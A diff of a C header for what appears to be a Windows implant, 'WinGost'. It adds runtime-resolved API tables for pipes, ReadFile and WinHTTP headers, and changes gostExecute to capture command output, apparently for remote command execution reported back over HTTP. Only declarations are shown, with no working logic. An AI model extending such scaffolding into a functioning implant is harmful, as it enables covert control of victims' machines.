@@ -11,6 +11,8 @@
 //#define CUSTOM_FUNC(name, ret_type, ...) ret_type(*name)(__VA_ARGS__);
 #define CUSTOM_FUNC(name, ret_type, ...) ret_type(*name)(__VA_ARGS__)
 
+#define CUSTOM_ZeroMemory(Destination,Length) custom_memset((Destination),0,(Length))
+
 typedef struct _COFF_HEADER {
     WORD Machine;
     WORD NumberOfSections;
@@ -71,6 +73,9 @@ typedef struct _KERNEL32_TABLE {
     WIN_API_FUNC(GetProcessHeap, HANDLE, VOID);
     WIN_API_FUNC(Sleep, VOID, DWORD dwMilliseconds);
     WIN_API_FUNC(CreateProcessA, BOOL, LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
+    WIN_API_FUNC(CreatePipe, BOOL, PHANDLE hReadPipe, PHANDLE hWritePipe, LPSECURITY_ATTRIBUTES lpPipeAttributes, DWORD nSize);
+    WIN_API_FUNC(SetHandleInformation, BOOL, HANDLE hObject, DWORD dwMask, DWORD dwFlags);
+    WIN_API_FUNC(ReadFile, BOOL, HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
     // WIN_API_FUNC(HeapAlloc, LPVOID, HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
     // WIN_API_FUNC(HeapFree, BOOL, HANDLE hHeap, DWORD dwFlags, LPVOID lpMem);
 } KERNEL32_TABLE, *PKERNEL32_TABLE;
@@ -85,7 +90,7 @@ typedef struct _WINGOST_TABLE {
     // Add WinGost function pointers here if needed
     CUSTOM_FUNC(gostSend, void, char* message, int message_len, const wchar_t* apiID, PFUNCTION_TABLE ft);
     CUSTOM_FUNC(gostPrint, void, char* message, BOOL format, int message_len, PFUNCTION_TABLE ft);
-    CUSTOM_FUNC(gostExecute, void, const char* command, PFUNCTION_TABLE ft);
+    CUSTOM_FUNC(gostExecute, BOOL, char* command, char* output, DWORD outputSize, PFUNCTION_TABLE ft);
 
 } WINGOST_TABLE, *PWINGOST_TABLE;
 
@@ -94,6 +99,7 @@ typedef struct _WINHTTP_TABLE {
     WIN_API_FUNC(WinHttpOpen, HINTERNET, LPCWSTR pwszUserAgent, DWORD dwAccessType, LPCWSTR pwszProxyName, LPCWSTR pwszProxyBypass, DWORD dwFlags);
     WIN_API_FUNC(WinHttpConnect, HINTERNET, HINTERNET hSession, LPCWSTR pswzServerName, INTERNET_PORT nServerPort, DWORD dwReserved);
     WIN_API_FUNC(WinHttpOpenRequest, HINTERNET, HINTERNET hConnect, LPCWSTR pwszVerb, LPCWSTR pwszObjectName, LPCWSTR pwszVersion, LPCWSTR pwszReferrer, LPCWSTR *ppwszAcceptTypes, DWORD dwFlags);
+    WIN_API_FUNC(WinHttpAddRequestHeaders, BOOL, HINTERNET hRequest, LPCWSTR lpszHeaders, DWORD dwHeadersLength, DWORD dwModifiers);
     WIN_API_FUNC(WinHttpSendRequest, BOOL, HINTERNET hRequest, LPCWSTR pwszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength, DWORD dwTotalLength, DWORD_PTR dwContext);
     WIN_API_FUNC(WinHttpReceiveResponse, BOOL, HINTERNET hRequest, LPVOID lpReserved);
     WIN_API_FUNC(WinHttpQueryDataAvailable, BOOL, HINTERNET hRequest, LPDWORD lpdwNumberOfBytesAvailable);
